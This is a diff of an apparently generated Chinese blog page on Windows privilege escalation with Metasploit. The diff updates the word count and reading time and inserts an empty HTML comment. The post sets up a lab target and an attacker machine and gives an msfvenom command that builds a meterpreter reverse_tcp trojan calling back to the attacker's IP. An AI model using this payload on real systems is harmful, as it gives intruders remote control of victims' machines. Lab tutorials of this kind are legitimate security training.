@@ -177,7 +177,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      560 字
+      561 字
     </span>
   
 
@@ -187,7 +187,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      9
+      10
        分钟
     </span>
   
@@ -220,7 +220,13 @@
             <h1 style="display: none"></h1>
             
             <div class="markdown-body" id="post-body">
-              <h1 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h1><h2 id="1-msf提权"><a href="#1-msf提权" class="headerlink" title="1.msf提权"></a>1.msf提权</h2><p>目标：windows 7 sp1 vl：192.168.8.53</p>
+              <h1 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h1><!-- 
+
+
+
+
+ -->
+<h2 id="1-msf提权"><a href="#1-msf提权" class="headerlink" title="1.msf提权"></a>1.msf提权</h2><p>目标：windows 7 sp1 vl：192.168.8.53</p>
 <p>攻击机：kali ：192.168.8.195</p>
 <p>生成木马：<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.8.195 lport=1234 -f exe &gt;1.exe</code></p>
 <h3 id="1-直接提取"><a href="#1-直接提取" class="headerlink" title="1.直接提取"></a>1.直接提取</h3><p><code>getsystem</code>：在目标非管理员时候会失败</p>
